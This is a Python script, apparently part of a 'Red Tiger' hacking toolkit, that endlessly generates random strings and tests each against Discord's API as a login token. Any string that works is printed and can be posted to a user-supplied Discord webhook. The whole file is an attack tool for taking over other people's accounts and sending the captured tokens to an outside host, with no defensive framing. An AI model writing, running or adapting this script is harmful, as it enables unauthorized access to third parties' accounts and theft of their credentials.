from Config.Config import *

import string
import requests
import json
import random

Title("Ip Generator")

def send_embed_webhook(webhook_url, embed_content, username=None, url=None):
                payload = {
                'embeds': [embed_content],
                'username': username,
                'avatar_url': url
                 }

                headers = {
            'Content-Type': 'application/json'
             }

                response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
username = 'Red Tiger'
url = 'https://cdn.discordapp.com/attachments/1184160374342299688/1184160439001686056/IMG_1506.png?ex=658af659&is=65788159&hm=9a0297ee590e78acbafc75bc4686ce2b553e40a2f2a850101378a09f23e32d08&'
webhook = input(f"{color.RED}\n[?] | Webhook ? (y, n) -> {color.RESET}")
if webhook in ['y']:
    webhook_url = input(f"{color.RED}[?] | URL Webhook -> {color.RESET}")
def token_check(token, nombre):

    try:

        result = requests.get('https://discordapp.com/api/v9/auth/login', headers={'Authorization': token})
        
        
        if webhook in ['y']:
            if result.status_code == 200:
             print(f"{color.GREEN}[+] | Token Found | {color.WHITE}{token}{color.GREEN} | Tests n°{nombre}{color.RESET}")
             embed_content = {
           'title': f'Token Found, Tests n°{nombre}',
           'description': f"**__Token:__**\n```{token}```",
           'color': color_webhook,
           'footer': {
            "text": "Red Tiger",
            "icon_url": "https://media.discordapp.net/attachments/944760272265031720/1179429697495498834/IMG_1506.png?ex=6582fb00&is=65708600&hm=cbdc48779b762d4d7c95c34bb68a8aabf8314519d0b50c4d7371bea19eac5db4&=&format=webp&quality=lossless",
             }
            }

             send_embed_webhook(webhook_url, embed_content, username, url)


            else:
                  print(f"{color.RED}[X] | Token Invalid | {color.WHITE}{token}{color.RED} | Tests n°{nombre}{color.RESET}")
        if webhook in ['n']:
             if result.status_code == 200:
                print(f"{color.GREEN}[+] | Token Found | {color.WHITE}{token}{color.GREEN} | Tests n°{nombre}{color.RESET}")
             else:
                  print(f"{color.RED}[X] | Token Invalid | {color.WHITE}{token}{color.RED} | Tests n°{nombre}{color.RESET}")
             

    except:
        print(f"{color.RED}[X] | Token Invalid | {color.WHITE}{token}{color.RED} | Tests n°{nombre}{color.RESET}")
nombre = 0
while True:
    def generate_random_string(length):
        characters = string.ascii_letters + string.digits + "._"
        return ''.join(random.choices(characters, k=length))

    random_string = generate_random_string(random.randint(60, 75))
    
    nombre += 1
    token = random_string


    token_check(token, nombre)
    Title(f"Discord Token Generator | Tests n°{nombre}")